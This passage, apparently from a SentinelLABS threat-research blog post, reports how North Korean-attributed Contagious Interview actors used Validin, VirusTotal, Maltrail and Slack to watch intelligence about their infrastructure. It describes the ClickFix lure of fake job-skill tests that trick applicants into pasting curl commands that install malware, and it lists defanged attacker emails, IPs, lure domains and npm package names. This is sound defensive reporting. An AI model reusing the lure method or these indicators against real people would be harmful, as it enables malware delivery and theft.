This analysis focuses on the abuse of cyber intelligence platforms by the actors behind the Contagious Interview campaign cluster employing the ClickFix social engineering technique.</li>\n<li>They operate in coordinated teams with real-time collaboration, likely using Slack and multiple intelligence sources such as Validin, VirusTotal, and Maltrail.</li>\n<li aria-level=\"1\">Although aware their infrastructure is detectable, they make only limited changes to reduce detection and disruption risk, while rapidly deploying new infrastructure in response to service provider takedowns.</li>\n<li aria-level=\"1\">This indicates a strategic focus on continuously replacing disrupted infrastructure with new assets to sustain operations and high victim engagement.</li>\n<li aria-level=\"1\">Factors such as decentralized command and competitive internal incentives may limit the threat actors’ ability to consistently protect existing infrastructure at scale.</li>\n<li aria-level=\"1\">SentinelLABS’ analysis suggests that the threat actors are effective at engaging targets; there were over 230 victims between January and March 2025, with the actual number likely being significantly higher.</li>\n<li aria-level=\"1\">In partnership with SentinelLABS and Validin, <a href=\"https://www.reuters.com/world/asia-pacific/its-scary-crypto-workers-under-siege-north-korean-hackers-2025-09-04/\" target=\"_blank\">Reuters provides further coverage</a> of the human dimension of this threat, exploring victim engagement methods and their personal impact.</li>\n</ul>\n<h2>Overview</h2>\n<p>In collaboration with the <a href=\"https://www.validin.com/company/\" target=\"_blank\" rel=\"noopener noreferrer\">internet intelligence platform Validin</a>, SentinelLABS has been tracking activity on the platform which we attribute with high confidence to North Korean threat actors involved in the <a href=\"https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/\" target=\"_blank\" rel=\"noopener noreferrer\">Contagious Interview</a> campaign cluster. This activity, which took place between March and June 2025, involved the threat actors examining cyber threat intelligence (CTI) information related to their infrastructure. Our unique visibility has provided valuable insights into their operational practices, internal coordination, infrastructure management and deployment, and victimology.</p>\n<p>SentinelLABS continuously tracks North Korean-aligned threat actors, including their <a href=\"https://www.sentinelone.com/labs/a-glimpse-into-future-scarcruft-campaigns-attackers-gather-strategic-intelligence-and-target-cybersecurity-professionals/\" target=\"_blank\" rel=\"noopener noreferrer\">persistent interest</a> in cyber threat intelligence. As part of SentinelLABS’ broader efforts to identify and disrupt North Korean operations in collaboration with partner organizations, SentinelLABS and Validin conducted a joint investigation, combining our threat intelligence expertise with Validin’s visibility into the threat actors&#8217; activities on their platform, to better understand these activities and provide actionable intelligence supporting defensive actions.</p>\n<p>SentinelLABS and Validin observed an intensive and coordinated effort by Contagious Interview threat actors to register and use Validin community access accounts within approximately 24 hours after Validin published a <a href=\"https://www.validin.com/blog/bybit_hack_infrastructure_hunt/\" target=\"_blank\" rel=\"noopener noreferrer\">blog post</a> on 11 March 2025. The post discusses the infrastructure of Lazarus, a suspected North Korean APT umbrella cluster associated with Contagious Interview activities. Validin’s community access portal provides free access to infrastructure intelligence information.</p>\n<p>The threat actors used Google Gmail addresses that we had already been tracking as Contagious Interview artifacts at the time of registration. Although Validin blocked the accounts shortly after registration, we observed the threat actors persisting in their efforts to use Validin by creating accounts at later dates. At that point, we intentionally kept one account active over the long term to monitor and gather intelligence on their activities.</p>\n<p>We observed that the Contagious Interview threat actors engaged in coordinated activity and likely operated in teams to investigate threat intelligence related to their infrastructure and to monitor for signs of detection. Indicators suggest they used multiple indicators of compromise (IOC) repositories and CTI platforms, including Validin, <a href=\"https://www.virustotal.com/\" target=\"_blank\" rel=\"noopener noreferrer\">VirusTotal</a>, and <a href=\"https://github.com/stamparm/maltrail/tree/master\" target=\"_blank\" rel=\"noopener noreferrer\">Maltrail</a>. We also identified indicators of real-time teamwork, including possible use of the <a href=\"https://slack.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Slack</a> platform to coordinate their investigations.</p>\n<p>Despite thoroughly examining threat intelligence and identifying artifacts that can be used to discover their infrastructure, the threat actors did not implement systematic, large-scale changes to make it harder to detect, thereby reducing its exposure to discovery and disruption. Instead, we observed only sporadic, limited-scale changes targeting specific artifacts used to identify Contagious Interview infrastructure, while the threat actors rapidly deployed new infrastructure in response to service provider takedowns.</p>\n<p>This may reflect a focus on investing resources to maintain operational readiness and sustain the campaign’s high volume of victim engagement by deploying new infrastructure rather than undertaking broad modifications to protect existing infrastructure. Based on log files unintentionally exposed on several Contagious Interview servers, we identified over 230 individuals affected during the period from January to March 2025, though the actual number is likely much higher.</p>\n<p>Given the continuous success of their campaigns in engaging targets, it may be more pragmatic and efficient for the threat actors to deploy new infrastructure rather than maintain existing assets. Potential internal factors, such as decentralized command structures or operational resource constraints, may restrict their capacity to rapidly implement coordinated changes. Moreover, competitive pressures stemming from <a href=\"https://reports.dtexsystems.com/DTEX-Exposing+DPRK+Cyber+Syndicate+and+Hidden+IT+Workforce.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">North Korea’s annual revenue quotas</a> for cyber teams likely incentivize operatives to make isolated adjustments to the infrastructure under their control in order to protect their own assets and outperform colleagues, rather than participate in centrally coordinated, large-scale updates.</p>\n<p>The threat actors also used Validin to scout and evaluate new infrastructure before acquisition, likely aiming to avoid assets previously flagged as malicious, which would increase detection risk and reduce operational effectiveness once deployed. Following acquisition, they continued to monitor their assets for signs of detection throughout their lifecycle. We were closely monitoring Contagious Interview infrastructure during its acquisition and deployment, which revealed repeated OPSEC failures, suggesting a lack of consistent operational security controls during the infrastructure setup phase.</p>\n<h2>Background | Contagious Interview and ClickFix</h2>\n<p>First used in 2023 to label a <a href=\"https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/\" target=\"_blank\" rel=\"noopener noreferrer\">campaign</a> targeting job seekers, the term Contagious Interview has since been used interchangeably in other contexts, including to refer to an APT group assessed to be a subset of the North Korean umbrella group Lazarus.</p>\n<p>In this post, we use Contagious Interview to refer to a cluster of campaigns, variants of the 2023 campaign, that target job applicants using diverse social engineering tactics to trick targets into executing malware.</p>\n<p>Contagious Interview activities predominantly target individuals active in the cryptocurrency industry, aiming to gain access to their systems for various purposes, including intelligence collection and the theft of cryptocurrency assets. This supports North Korea’s efforts in evading sanctions and generating illicit revenue for financing its projects, including <a href=\"https://www.bbc.com/news/world-asia-60281129\" target=\"_blank\" rel=\"noopener noreferrer\">missile programmes</a>.</p>\n<p>Contagious Interview campaigns have been typically associated with the umbrella threat cluster Lazarus. DTEX Systems <a href=\"https://reports.dtexsystems.com/DTEX-Exposing+DPRK+Cyber+Syndicate+and+Hidden+IT+Workforce.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">has attributed these campaigns</a> to a group referred to as Gwisin Gang, which likely emerged from an IT organization whose subordination within the North Korean state apparatus is still subject to assessment.</p>\n<p>Recent Contagious Interview campaigns, also referred to as <a href=\"https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/\" target=\"_blank\" rel=\"noopener noreferrer\">ClickFake Interview</a>, involve a social engineering technique known as ClickFix. We assess that the threat actors whose activities are discussed in this post are involved in these campaigns.</p>\n<p>ClickFix typically proceeds as follows. A targeted job seeker receives an invitation to participate in a job application process, directing them to a lure website where they are prompted to complete a skill assessment. During the assessment, the applicant encounters a fabricated error message, such as a camera access issue. They are then instructed to copy and paste command lines, often involving utilities like <code>curl</code>, to download and execute a supposed update from a separate malware distribution server, unknowingly deploying malware in the process. This technique is discussed in more detail in <a href=\"https://blog.talosintelligence.com/python-version-of-golangghost-rat/\" target=\"_blank\" rel=\"noopener noreferrer\">previous research</a>.</p>\n<h2>Account Registrations | Initial Activities</h2>\n<p>The threat actors started creating Validin community accounts on 12 March 2025 at 22:44:11 UTC, an activity which spanned a relatively short interval of approximately 15 minutes, suggesting a concentrated and coordinated approach. We present below the email addresses used for account registrations as well as the IP addresses from which the registrations were conducted. We attribute this activity to Contagious Interview threat actors based on multiple indicators.</p>\n<div style=\"overflow-x:auto; font-size:0.8em;\">\n<table style=\"border-collapse: collapse; width: 100%; height: 120px;\">\n<tbody>\n<tr style=\"height: 25px;\">\n<td style=\"width: 50%; height: 25px;\"><strong>Email Address</strong></td>\n<td style=\"width: 50%; height: 25px;\"><strong>IP Address</strong></td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 50%; height: 25px;\">jimmr6587[@]gmail.com</td>\n<td style=\"width: 50%; height: 25px;\">38.170.181[.]10</td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 50%; height: 25px;\">excellentreporter321[@]gmail.com</td>\n<td style=\"width: 50%; height: 25px;\">194.33.45[.]162</td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 50%; height: 25px;\">rockstar96054[@]gmail.com</td>\n<td style=\"width: 50%; height: 25px;\">96.62.127[.]126</td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 50%; height: 25px;\">richardkdavis45[@]gmail.com</td>\n<td style=\"width: 50%; height: 25px;\">45.86.208[.]162</td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 50%; height: 25px;\">fairdev610[@]gmail.com</td>\n<td style=\"width: 50%; height: 25px;\">70.39.70[.]194</td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 50%; height: 25px;\">marvel714jm[@]gmail.com</td>\n<td style=\"width: 50%; height: 25px;\">77.247.126[.]189</td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 50%; height: 25px;\">montessantiago9712[@]gmail.com</td>\n<td style=\"width: 50%; height: 25px;\">38.170.181[.]10</td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 50%; height: 25px;\">hundredup2023[@]gmail.com</td>\n<td style=\"width: 50%; height: 25px;\">70.32.3[.]15</td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 50%; height: 25px;\">huzqur023[@]gmail.com</td>\n<td style=\"width: 50%; height: 25px;\">89.19.58[.]51</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>A significant portion of the IP addresses used for registration, such as <code>194.33.45[.]162</code>, <code>70.39.70[.]194</code>, <code>70.32.3[.]15</code>, <code>38.170.181[.]10</code>, and <code>45.86.208[.]162</code>, <a href=\"https://spur.us/astrill-vpn-and-remote-worker-fraud/\" target=\"_blank\" rel=\"noopener noreferrer\">have been associated</a> with Astrill VPN, a VPN service popular among North Korean threat clusters.</p>\n<p>Additionally, even before the account registrations, SentinelLABS and Validin were already tracking the email addresses <code>fairdev610[@]gmail.com</code>, <code>richardkdavis45[@]gmail.com</code>, <code>rockstar96054[@]gmail.com</code>, <code>excellentreporter321[@]gmail.com</code>, and <code>hundredup2023[@]gmail.com</code> as Contagious Interview artifacts. We found these addresses in unintentionally exposed JavaScript scripts (<a href=\"https://nodejs.org/\" target=\"_blank\" rel=\"noopener noreferrer\">Node.js</a> applications) on Contagious Interview ClickFix malware distribution servers.</p>\n<p>We have been tracking these Node.js applications under the ContagiousDrop moniker since their initial exposure. Typically implemented as <code>app.js</code> files, the applications distribute malware to targeted individuals and notify the threat actors via email about victim engagement. This engagement includes information submission to Contagious Interview lure websites and the execution of commands, such as <code>curl</code>, as directed by the threat actors as part of the ClickFix social engineering tactic. A ContagiousDrop sample is highlighted in <a href=\"https://www.silentpush.com/blog/contagious-interview-front-companies/\" target=\"_blank\" rel=\"noopener noreferrer\">previous research</a> on Contagious Interview activity published in April 2025. These applications will be discussed in greater detail later in this blog post.</p>\n<p>Moreover, some email addresses have been used for registering Contagious Interview domains pointing to lure websites. For example, <code>marvel714jm[@]gmail.com</code> and <code>jimmr6587[@]gmail.com</code> have been used to register the <code>paxos-video-interview[.]com</code> and <code>skill-share[.]org</code> domains, respectively.</p>\n<p>Finally, some email addresses were used to register Validin accounts from IP addresses that were also used to register or log in to accounts with other email addresses we attribute with high confidence to Contagious Interview. For example, the account <code>montessantiago9712[@]gmail.com</code> was registered from the IP address <code>38.170.181[.]10</code>, the same as <code>jimmr6587[@]gmail.com</code>.</p>\n<p>Approximately 15 minutes after the first observed account registration, Validin blocked the Contagious Interview accounts and subsequently prevented further community registrations originating from known Astrill VPN IP addresses or using Gmail accounts.</p>\n<h2>Account Registrations | Further Activities</h2>\n<p>After likely realizing that their access to Validin had been blocked, Contagious Interview threat actors attempted to register community accounts again on 25 March 2025 (13 days after the initial registration activity) and 26 April 2025. This time, they also used non-Gmail email addresses, most likely in response to Validin blocking Gmail-based registrations: <code>info[@]versusx[.]us</code> and <code>invite[@]quiz-nest[.]com</code>. We present below the email addresses used for Validin account registrations, along with the date, time, and originating IP addresses of these registrations.</p>\n<div style=\"overflow-x:auto; font-size:0.8em;\">\n<table style=\"border-collapse: collapse; width: 100%; height: 120px;\">\n<tbody>\n<tr style=\"height: 25px;\">\n<td style=\"width: 35%; height: 25px;\"><strong>Email Address</strong></td>\n<td style=\"width: 19.7761%; height: 25px;\"><strong>Date (UTC)</strong></td>\n<td style=\"width: 20.2239%; height: 25px;\"><strong>Time (UTC)</strong></td>\n<td style=\"width: 25%; height: 25px;\"><strong>IP Address</strong></td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 35%; height: 25px;\">info[@]versusx[.]us</td>\n<td style=\"width: 19.7761%; height: 25px;\">2025-03-25</td>\n<td style=\"width: 20.2239%; height: 25px;\">13:33:01</td>\n<td style=\"width: 25%; height: 25px;\">181.59.180[.]84</td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 35%; height: 25px;\">mvsolution9[@]gmail.com</td>\n<td style=\"width: 19.7761%; height: 25px;\">2025-04-26</td>\n<td style=\"width: 20.2239%; height: 25px;\">16:48:54</td>\n<td style=\"width: 25%; height: 25px;\">181.215.9[.]29</td>\n</tr>\n<tr style=\"height: 25px;\">\n<td style=\"width: 35%; height: 25px;\">invite[@]quiz-nest[.]com</td>\n<td style=\"width: 19.7761%; height: 25px;\">2025-04-26</td>\n<td style=\"width: 20.2239%; height: 25px;\">16:51:29</td>\n<td style=\"width: 25%; height: 25px;\">181.215.9[.]29</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>The domain registration records for <code>versusx[.]us</code> include the email address <code>brooksliam534[@]gmail.com</code>, which has also been used to register several Contagious Interview domains discussed in <a href=\"https://www.validin.com/blog/inoculating_contagious_interview_with_validin/\" target=\"_blank\" rel=\"noopener noreferrer\">previous research</a>, such as <code>willotalent[.]us</code> and <code>nvidia-release[.]us</code>. Additionally, indicators suggest that the <code>brooksliam534[@]gmail.com</code> account <a href=\"https://socket.dev/npm/user/liambrooksman/packages\" target=\"_blank\" rel=\"noopener noreferrer\">has been involved</a> in publishing malicious npm (Node Package Manager) packages (<code>cors-app</code> and <code>cors-parser</code>) as part of a software supply chain campaign <a href=\"https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket\" target=\"_blank\" rel=\"noopener noreferrer\">attributed</a> to Contagious Interview threat actors.</p>\n<figure id=\"attachment_125905\" aria-describedby=\"caption-attachment-125905\" style=\"width: 993px\" class=\"wp-caption aligncenter\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_6.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img fetchpriority=\"high\" decoding=\"async\" class=\"wp-image-125905 size-full\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_6.jpg\" alt=\"&quot;The\" width=\"993\" height=\"373\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_6.jpg 993w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_6-300x113.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_6-768x288.jpg 768w\" sizes=\"(max-width: 993px) 100vw, 993px\" /></a><figcaption id=\"caption-attachment-125905\" class=\"wp-caption-text\">The <em>liambrooksman</em> persona (<em>brooksliam534[@]gmail.com</em>) tracked as maintainer of <em>cors-app</em> and <em>cors-parser</em></figcaption></figure>\n<p>We observed the registration of <code>invite[@]quiz-nest[.]com</code> approximately two minutes after the threat actors attempted to register <code>mvsolution9[@]gmail.com</code>. The registration of <code>mvsolution9[@]gmail.com</code> failed due to measures Validin implemented following the March 2025 account registration activities. Both actions originated from the same IP address, <code>181.215.9[.]29</code>, suggesting the involvement of a single operator.</p>\n<p><code>mvsolution9[@]gmail.com</code> has been used to register two Contagious Interview domains: <code>evalassesso[.]com</code>, which Sekoia has also <a href=\"https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/\" target=\"_blank\" rel=\"noopener noreferrer\">attributed</a> to Contagious Interview, and <code>speakure[.]com</code>. The <code>quiz-nest[.]com</code> website, at least up to 24 May 2025, was implemented in a manner typical of Contagious Interview lure websites.</p>\n<p>We also observed login attempts on 9 May 2025 using the <code>excellentreporter321[@]gmail.com</code> and <code>marvel714jm[@]gmail.com</code> accounts, which had been blocked by Validin in March 2025.</p>\n<p>The threat actors’ shift to using non-Gmail addresses, along with their continuous attempts to bypass Validin’s access controls, highlights their adaptability and persistent interest in Validin data. Recognizing their persistence in obtaining community access, we intentionally kept only the <code>info[@]versusx[.]us</code> account active to monitor subsequent activity, determine their objectives, and gather further intelligence. Since then, the Contagious Interview threat actors have continued attempting to register new Validin accounts through the time of writing this post.</p>\n<h2>Account Registrations | Personas</h2>\n<p>In accordance with Validin&#8217;s policy for community accounts, the Contagious Interview actors completed registration forms requesting information such as full name, affiliation, and reason for registration.</p>\n<div style=\"overflow-x:auto; font-size:0.8em;\">\n<table style=\"border-collapse: collapse; width: 100%; height: 120px;\">\n<tbody>\n<tr>\n<td style=\"width: 38%;\"><strong>Account</strong></td>\n<td style=\"width: 27%;\"><strong>Full Name</strong></td>\n<td style=\"width: 15%;\"><strong>Affiliation</strong></td>\n<td style=\"width: 20%;\"><strong>Reason</strong></td>\n</tr>\n<tr>\n<td style=\"width: 38%;\">excellentreporter321[@]gmail.com</td>\n<td style=\"width: 27%;\">Andress Victor Pabon Carrascal</td>\n<td style=\"width: 15%;\">DAG</td>\n<td style=\"width: 20%;\">Find My Platform.</td>\n</tr>\n<tr>\n<td style=\"width: 38%;\">fairdev610[@]gmail.com</td>\n<td style=\"width: 27%;\">Fair Dev</td>\n<td style=\"width: 15%;\">Talents Vision</td>\n<td style=\"width: 20%;\">Reference</td>\n</tr>\n<tr>\n<td style=\"width: 38%;\">hundredup2023[@]gmail.com</td>\n<td style=\"width: 27%;\">Thomas Mitchell</td>\n<td style=\"width: 15%;\">Baymax</td>\n<td style=\"width: 20%;\">to find domain</td>\n</tr>\n<tr>\n<td style=\"width: 38%;\">huzqur023[@]gmail.com</td>\n<td style=\"width: 27%;\">Hamza</td>\n<td style=\"width: 15%;\">Starlink</td>\n<td style=\"width: 20%;\">I will use this for phishing check</td>\n<tr>\n<td style=\"width: 38%;\">info[@]versusx[.]us</td>\n<td style=\"width: 27%;\">Noraida</td>\n<td style=\"width: 15%;\">Versusx</td>\n<td style=\"width: 20%;\">Research</td>\n<tr>\n<td style=\"width: 38%;\">invite[@]quiz-nest[.]com</td>\n<td style=\"width: 27%;\">Anika Larkin</td>\n<td style=\"width: 15%;\">Quiz Nest</td>\n<td style=\"width: 20%;\">Google</td>\n</tr>\n<tr>\n<td style=\"width: 38%;\">jimmr6587[@]gmail.com</td>\n<td style=\"width: 27%;\">jimmr</td>\n<td style=\"width: 15%;\">Individual</td>\n<td style=\"width: 20%;\">Github</td>\n<tr>\n<td style=\"width: 38%;\">marvel714jm[@]gmail.com</td>\n<td style=\"width: 27%;\">Mar Vel</td>\n<td style=\"width: 15%;\">Paxos</td>\n<td style=\"width: 20%;\">Valisin</td>\n</tr>\n<tr>\n<td style=\"width: 38%;\">montessantiago9712[@]gmail.com</td>\n<td style=\"width: 27%;\">Santiago Montes</td>\n<td style=\"width: 15%;\">Personal</td>\n<td style=\"width: 20%;\">Virus Checker</td>\n<tr>\n<td style=\"width: 38%;\">mvsolution9[@]gmail.com</td>\n<td style=\"width: 27%;\">Anika Larkin</td>\n<td style=\"width: 15%;\">Test</td>\n<td style=\"width: 20%;\">Ggle</td>\n</tr>\n<tr>\n<td style=\"width: 38%;\">richardkdavis45[@]gmail.com</td>\n<td style=\"width: 27%;\">Richard Davis</td>\n<td style=\"width: 15%;\">CreatDao</td>\n<td style=\"width: 20%;\">/</td>\n<tr>\n<td style=\"width: 38%;\">rockstar96054[@]gmail.com</td>\n<td style=\"width: 27%;\">Rock Lee</td>\n<td style=\"width: 15%;\">FWW</td>\n<td style=\"width: 20%;\">Googling</td>\n</tbody>\n</table>\n</div>\n<p>The threat actors used a diverse range of names, from generic handles like <code>jimmr</code> to pop-culture references such as <code>Rock Lee</code> (a character from the Japanese anime series Naruto), <code>Mar Vel</code> (likely referring to Mar-Vell, a Captain Marvel character from Marvel Comics), and <code>Santiago Montes</code> (the main protagonist of the animated television series Santiago of the Seas), as well as more elaborate, seemingly legitimate full names like <code>Andress Victor Pabon Carrascal</code>. The reuse of the name <code>Anika Larkin </code>for two different accounts, <code>invite[@]quiz-nest[.]com</code> and <code>mvsolution9[@]gmail.com</code>, combined with both accounts being registered from the same IP address (<code>181.215.9[.]29</code>) within approximately two minutes, suggests the involvement of a single individual.</p>\n<p>Some affiliations correspond to fake hiring platforms operated by Contagious Interview. For example, <code>Quiz Nest</code> aligns with the domain <code>quiz-nest[.]com</code>, while <code>Paxos</code> corresponds to domains such as <code>paxos-video-interview[.]com</code> and <code>paxosassessments[.]com</code>. The account <code>marvel714jm[@]gmail.com</code>, which used the <code>Paxos</code> affiliation, was also used to register the domain <code>paxos-video-interview[.]com</code>. This suggests the actors leveraged their own infrastructure and fabricated brands to create a more convincing facade of legitimacy.</p>\n<p>In addition to these fake platforms, the threat actors also used names of legitimate, well-known companies such as <code>Starlink</code>, as well as vague descriptors like <code>Individual</code> or <code>Personal</code>.</p>\n<p>Some of the stated reasons for registration provide direct insight into the threat actors’ primary objective: investigating threat intelligence information related to their infrastructure. For example, pretexts such as <code>Research</code>,  <code>To find domain</code>, and <code>Find My Platform</code> indicate their interest in exploring Validin’s data.</p>\n<h2>Validin Use | Activity Across Multiple Platforms</h2>\n<p>The majority of accounts began using the Validin platform immediately after registration. In total, we observed 57 unique search terms across all categories supported by the platform, including domain names, hashes, URLs, web metadata, keywords, and IP addresses.</p>\n<p>The threat actors did not search for any IOCs reported in Validin’s <a href=\"https://www.validin.com/blog/bybit_hack_infrastructure_hunt/\" target=\"_blank\" rel=\"noopener noreferrer\">blog post</a>, which we suspect triggered their initial interest in the platform. Therefore, we assess the post only brought Validin to their attention, after which they integrated Validin into a broader workflow for investigating threat intelligence related to their operations by leveraging multiple sources.</p>\n<p>We observed indicators suggesting that the threat actors used additional IOC repositories and platforms alongside Validin to conduct comprehensive investigations. These included VirusTotal and the <code>apt_lazarus.txt</code> file, which is part of the Maltrail project and <a href=\"https://github.com/stamparm/maltrail/blob/master/trails/static/malware/apt_lazarus.txt\" target=\"_blank\" rel=\"noopener noreferrer\">publicly available</a> on GitHub. This file is regularly updated with domain names, IP addresses, and URLs attributed to the Lazarus umbrella APT cluster, as well as sources providing attribution information or context, such as social media, blog posts, and other threat intelligence platforms (including VirusTotal and Validin). VirusTotal is a malware analysis service and threat intelligence platform that aggregates detection results, reputation assessments, and contextual information for files, URLs, domains, and IP addresses from a wide range of detection engines, third-party tools, and its user community.</p>\n<p>The very first search term used by the threat actors was the keyword <code>TalentCheck</code>, entered on 12 March 2025 at 22:44:40 UTC. <code>TalentCheck</code> is the title of multiple Contagious Interview websites, including <code>skillcheck[.]pro</code>, <code>talentcheck[.]pro</code>, and <code>vidassesspro[.]com</code>. The keyword was first published as an artifact identifying Contagious Interview websites approximately one day earlier by Maltrail in <code>apt_lazarus.txt</code>, on 11 March 2025 at 11:18:22 UTC. This suggests that the threat actors likely used Validin to investigate what additional information the platform could provide based on the <code>TalentCheck</code> keyword they first observed in <code>apt_lazarus.txt</code>.</p>\n<figure id=\"attachment_125914\" aria-describedby=\"caption-attachment-125914\" style=\"width: 678px\" class=\"wp-caption aligncenter\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_1.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img decoding=\"async\" class=\"wp-image-125914 size-full\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_1.jpg\" alt=\"TalentCheck in apt_lazarus.txt\" width=\"678\" height=\"255\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_1.jpg 678w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_1-300x113.jpg 300w\" sizes=\"(max-width: 678px) 100vw, 678px\" /></a><figcaption id=\"caption-attachment-125914\" class=\"wp-caption-text\"><em>TalentCheck</em> in <em>apt_lazarus.txt</em></figcaption></figure>\n<p>Most of the search terms the threat actors used in Validin had been published exclusively in <code>apt_lazarus.txt</code> at the time of the search and were queried shortly after their appearance in the file, sometimes within less than an hour. This supports our assessment that the Contagious Interview actors closely monitored <code>apt_lazarus.txt</code> and used Validin to gather further details and contextual information.</p>\n<p>In addition to Maltrail, we suspect that the Contagious Interview threat actors also use VirusTotal, or monitor what information about their infrastructure and malware is available on the platform, in conjunction with Validin. For example, the account <code>richardkdavis45[@]gmail.com</code> queried Validin for the URL <code>https[://]robinhood[.]evalvidz[.]com/invite/fZ6j8A2k</code> on 12 March 2025 at 22:59:20 UTC, just a few minutes after the exact same URL was first submitted to VirusTotal at 22:54:24 UTC.</p>\n<p>Based on log files, we were able to reconstruct the exact navigation paths of the Contagious Interview threat actors within Validin. We observed a strong interest in external references that provide attribution information for specific search terms, which Validin displays in the <code>Reputation Factors</code> panel on the search results page. For most of the domains they searched, the threat actors visited every available external reference, demonstrating a determined effort to conduct thorough CTI investigations by gathering information from multiple sources.</p>\n<figure id=\"attachment_125911\" aria-describedby=\"caption-attachment-125911\" style=\"width: 1999px\" class=\"wp-caption aligncenter\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_12.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img decoding=\"async\" class=\"wp-image-125911 size-full\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_12.jpg\" alt=\"Reconstructed navigation path of the jimmr6587[@]gmail.com account\" width=\"1999\" height=\"644\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_12.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_12-300x97.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_12-1024x330.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_12-768x247.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_12-1536x495.jpg 1536w\" sizes=\"(max-width: 1999px) 100vw, 1999px\" /></a><figcaption id=\"caption-attachment-125911\" class=\"wp-caption-text\">Reconstructed navigation path of the <em>jimmr6587[@]gmail.com</em> account</figcaption></figure>\n<h2>Validin Use | Team Collaboration</h2>\n<p>We observed multiple accounts searching for the same terms within a very short time frame, indicating a coordinated and collaborative effort involving multiple individuals. In addition, we identified strong indicators that the threat actors were using <a href=\"https://slack.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Slack</a>, a messaging platform commonly used for team communication and collaboration, to coordinate their activities.</p>\n<p>When investigating patterns of account activity and search behavior using Validin log data, we observed that the <code>jimmr6587[@]gmail.com</code> account was the first to search for the domain <code>webcamfixer[.]online</code> on 12 March 2025 at 22:54:19 UTC, followed by <code>excellentreporter321[@]gmail.com</code> (22:55:17 UTC), <code>rockstar96054[@]gmail.com</code> (22:55:25 UTC), <code>richardkdavis45[@]gmail.com</code> (22:55:43 UTC), and <code>fairdev610[@]gmail.com</code> (22:55:55 UTC).</p>\n<p>Our cross-examination of web server log data revealed that the search by <code>jimmr6587[@]gmail.com</code> was followed by requests to Validin from Slack Robots for the same URL generated by the search (<code>/detail?type=dom&amp;find=webcamfixer[.]online</code>). <a href=\"https://api.slack.com/robots\" target=\"_blank\" rel=\"noopener noreferrer\">Slack Robots</a> retrieve web content when a user posts a URL in a channel or direct message, displaying summary information such as the page title, meta description, and a preview image.</p>\n<p>These Slack Bot requests were followed by requests to the same URL from the IP addresses from which the accounts <code>excellentreporter321[@]gmail.com</code>, <code>rockstar96054[@]gmail.com</code>, <code>richardkdavis45[@]gmail.com</code>, and <code>fairdev610[@]gmail.com</code> had logged in. The timing of these requests aligns with each account’s respective search for <code>webcamfixer[.]online</code> as recorded in Validin logs.</p>\n<figure id=\"attachment_125910\" aria-describedby=\"caption-attachment-125910\" style=\"width: 723px\" class=\"wp-caption aligncenter\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_13.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-125910\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_13.jpg\" alt=\"Web server log data\" width=\"723\" height=\"283\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_13.jpg 723w, https://www.sentinelone.com/wp-content/uploads/2025/07/ContInt_Validin_July2025_13-300x117.jpg 300w\" sizes=\"auto, (max-width: 723px) 100vw, 723px\" /></a><figcaption id=\"caption-attachment-125910\" class=\"wp-caption-text\">Web server log data</figcaption></figure>\n<p>This suggests that the individual operating the <code>jimmr6587[@]gmail.com</code> account searched for <code>webcamfixer[.]online</code> in Validin, pasted the resulting URL into Slack, and that the individuals behind the other accounts subsequently clicked on the shared link in quick succession.</p>\n<h2>Validin Use | Limited Infrastructure Changes</h2>\n<p>Despite thoroughly investigating CTI information and identifying artifacts that could be used to discover their infrastructure, we did not observe any systematic or widespread actions by the Contagious Interview threat actors to make their infrastructure more difficult to discover 